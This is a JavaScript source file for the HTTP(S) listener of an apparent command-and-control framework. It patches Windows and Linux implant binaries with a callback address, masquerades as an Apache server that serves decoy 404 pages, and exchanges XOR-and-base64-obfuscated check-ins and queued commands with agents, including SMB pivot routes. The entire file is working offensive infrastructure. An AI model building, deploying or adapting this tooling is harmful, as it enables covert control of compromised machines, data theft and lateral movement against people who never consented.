import express from 'express';
import bodyParser from 'body-parser';
import fs from 'fs';
import https from 'https';
import Stage from './listener_prep_agent.js';
import * as ListenersAPI  from './listeners_api.js';
//import { Z_FIXED } from 'zlib';

//Fix error when it fails to bind to IP
export default class HTTP {
	constructor(agents,smb) {
		this.options = {
			'START': 'False',
			'HOST': '127.0.0.1',
			'PORT': '80',
			'HTTPS': 'False',
			'SERVER_HEADER' : 'Apache/2.4.29 (Debian)'
		}
		this.optionsBase = JSON.parse(JSON.stringify(this.options));
		this.app = express();
		this.app.disable('x-powered-by');

		this.app.use(bodyParser.text({'type':'application/json'}));
		this.app.get('/*', (req, res) => res.send(this.createForOhFor(req.originalUrl,res,req)));
		this.app.post('/*', (req, res) => res.send(this.manageRequest(req,res)));
		this.running = 'Stopped';

		this.agents = agents;
		this.smb = smb;

		if (fs.existsSync('data/save_states/http_listener.json')) {
			this.options = JSON.parse(fs.readFileSync('data/save_states/http_listener.json'));
		}

		if (this.options['START'].toLowerCase() == 'true') {
			this.start();
		}
	}

	encryptXor(text, key) {
		return Array.from(
			text,
			(c, i) => String.fromCharCode(c.charCodeAt() ^ key.charCodeAt(i % key.length))
		).join('');
	}


	createForOhFor(path, res, req) {
		const spaces = Array(Math.floor((Math.random() * 100) + 1)).join(' ');
		this.forohfor = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ${path} was not found on this server.</p>
<hr>
<address>Server at 192.168.53.142 Port ${this.options['PORT']}</address>
</body></html>${spaces}`;
		res.status(404);
		res.set('Server',this.options['SERVER_HEADER']);
		return this.forohfor;
	}

	start() {
		const that = this;
		if (this.running == 'Running') {
			console.log('[X] HTTP(S) Listener already running!');
			return;
		}

		if (this.options['HTTPS'].toLowerCase() == 'false') {
			let stage = new Stage();
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'0','static/agents/agent_windows/AgentDLL.dll', 'data/agents_staged/AgentDLL.dll');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'0','static/agents/agent_windows/AgentDLL32.dll', 'data/agents_staged/AgentDLL32.dll');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'0','static/agents/agent_windows/AgentEXE.exe', 'data/agents_staged/AgentEXE.exe');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'0','static/agents/agent_windows/AgentEXE32.exe', 'data/agents_staged/AgentEXE32.exe');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'0','static/agents/agent_linux/run.py', 'data/agents_staged/run.py', 'linux');
			this.listener = this.app.listen(this.options['PORT'], "0.0.0.0", () => {console.log(`[*] HTTPS Listener listening on port ${this.options['PORT']}!`);this.running='Running';that.agents.connections.sendAll(JSON.stringify({'http_listener_state': 'Running'}));});
		}
		else {
			let stage = new Stage();
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'1','static/agents/agent_windows/AgentDLL.dll', 'data/agents_staged/AgentDLL.dll');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'1','static/agents/agent_windows/AgentDLL32.dll', 'data/agents_staged/AgentDLL32.dll');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'1','static/agents/agent_windows/AgentEXE.exe', 'data/agents_staged/AgentEXE.exe');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'1','static/agents/agent_windows/AgentEXE32.exe', 'data/agents_staged/AgentEXE32.exe');
			stage.editBinaryHTTP(this.options['HOST'],this.options['PORT'],'1','static/agents/agent_linux/run.py', 'data/agents_staged/run.py', 'linux');
			this.listener = https.createServer({
							key: fs.readFileSync('certs/key.pem'),
							cert: fs.readFileSync('certs/cert.pem'),
							passphrase: '1234'}, this.app).listen(this.options['PORT'], "0.0.0.0",  () => {console.log(`[*] HTTPS Listener listening on port ${this.options['PORT']}!`);this.running='Running';that.agents.connections.sendAll(JSON.stringify({'http_listener_state': 'Running'}));});
		}
	}

	stop() {
		if (this.running !== 'Stopped') {
			this.running = 'Stopped';
			console.log('[X] HTTP Listener stopped!');
			this.listener.close();
		}
		else {
			console.log('[X] HTTP Listener already stopped!');
		}
	}

	manageRequest(req, res) {
		//console.log(req.body);
		const today = new Date();
		let date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
		const time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
		date = date+' '+time;
		try {
			const xorKey = 'fCqZz26!z@PppZ9';
			const dataJson = JSON.parse(req.body);
			const dataEnc = dataJson['request'];
			let data = dataEnc;
			let buff = Buffer.from(data, 'base64');
			let text = buff.toString('ascii');
			let dec = this.encryptXor(text,xorKey);

			const fullData = JSON.parse(dec);
			const agentData = fullData['host'];
			const agentIP = agentData['ip'];
			const agentUUID = agentData['uuid'];

			agentData['lastCheckIn'] = (new Date()).getTime();

			const agentQueueFilePath = 'data/queue/'+agentUUID+'.json';
			const agentDataFilePath = 'data/agents/'+agentUUID+'.json';
			const agentRoutesPath = 'data/routes/'+agentUUID+'.json';

			if (!fs.existsSync(agentDataFilePath)) {
				console.log(`[+] ${date} | New agent ${agentUUID} connected from ${agentIP}!`);
			}
			this.agents.addAgent(agentUUID,agentData);

			if ('results' in fullData) {
				if (fullData['results'].includes('Exiting.')) { //Fix exiting
					console.log(`[X] Agent ${agentUUID} Exiting.`);
					this.agents.delAgent(agentUUID);
				}
				else {
					agentData['results'] = fullData['results'];
					fs.writeFileSync(agentDataFilePath, JSON.stringify(agentData), function (err) {
						if (err) throw err;
					});
				}

				this.agents.sendUpdate();

				//We check if it includes exiting again for SMB types so we dont re-create the file for a deleted agent
				if (agentData["type"] === "smb" && !fullData['results'].includes('Exiting.')) {
					delete agentData['results'];
					fs.writeFileSync(agentDataFilePath, JSON.stringify(agentData), function (err) {
						if (err) throw err;
					});
				}
			} else {
				this.agents.sendUpdate();
			}

			// On First SMB Pivot Callback change '0' to its UUID in the routes file
			if (agentData['type'] == 'smb') {
				const updatedRoutes = this.smb.updateUUID(agentIP,agentUUID);
			}

			//On Agent Connect back, if a routes file exists check for commands
			let allRemoteConnections = [];
			if (fs.existsSync(agentRoutesPath)) {
				allRemoteConnections = this.smb.checkWork(agentRoutesPath);
			}

			if (fs.existsSync(agentQueueFilePath)) {
				let contents = fs.readFileSync(agentQueueFilePath);

				//SMB update with other commands
				if (allRemoteConnections.length > 0) {
					contents = JSON.parse(contents);
					contents["connect"] = allRemoteConnections;
					contents = JSON.stringify(contents);
				}
				//Create an SMB routes file when an agent runs connect under the UUID of the agent running connect
				this.smb.createRoute(contents, agentRoutesPath);

				let encCommand = this.encryptXor(contents.toString('ascii'),xorKey);
				encCommand = Buffer.from(encCommand).toString('base64');

				let finalCommand = `{"response":"${encCommand}"}`;

				fs.unlinkSync(agentQueueFilePath);

				res.set('Server',this.options['SERVER_HEADER']);
				return finalCommand;
			} else if (allRemoteConnections.length > 0) {
				let contents = allRemoteConnections;
				contents = {"connect":contents}
				contents = JSON.stringify(contents);

				let encCommand = this.encryptXor(contents.toString('ascii'),xorKey);
				encCommand = Buffer.from(encCommand).toString('base64');

				let finalCommand = `{"response":"${encCommand}"}`;

				res.set('Server',this.options['SERVER_HEADER']);
				return finalCommand;
			}
			else {
				const forohfor = this.createForOhFor(req.originalUrl,res);
				return this.forohfor;
			}
		}
		catch(err) {
			console.log(err);
			console.log(`[!] ${date} | NON AGENT DATA: ${req.body}`); //Log non agent data
			const forohfor = this.createForOhFor(req.originalUrl,res);
			return this.forohfor;
		}
	}

	getState() {
		return {'http_listener_settings':this.options, 'http_listener_state': this.running};
	}

	postUpdate(data) {
		if ('settings' in data) {
			for (const setting in data['settings']) {
				switch (setting.toLowerCase())  {
					case 'start':
						if (data['settings'][setting] === 'false' || data['settings'][setting] === 'true' ) {
							this.options[setting.toUpperCase()] = data['settings'][setting];
						}
					case 'host':
						this.options[setting.toUpperCase()] = data['settings'][setting];
					case 'port':
						if (!(isNaN(data['settings'][setting])) && parseInt(data['settings'][setting]) < 65536) {
							this.options[setting.toUpperCase()] = data['settings'][setting];
						}
					case 'https':
						if (data['settings'][setting] === 'false' || data['settings'][setting] === 'true' ) {
							this.options[setting.toUpperCase()] = data['settings'][setting];
						}
					case 'server_header':	
						this.options[setting.toUpperCase()] = data['settings'][setting];
				}
			} //Settings Validation Required
			fs.writeFileSync('data/save_states/http_listener.json',JSON.stringify(this.options));
		}
		else if ('action' in data) {
			switch(data['action']) {
				case 'start':
					this.start();
					break;
				case 'stop':
					this.stop()
					break;
				case 'restart':
					this.stop();
					this.start();
					break;
				case 'reset':
					this.options = JSON.parse(JSON.stringify(this.optionsBase));
					fs.unlinkSync('data/save_states/http_listener.json');
					break;
			}
		}
		const returnData = this.getState();
		returnData['send'] = 'all';
		return returnData;
	}
}
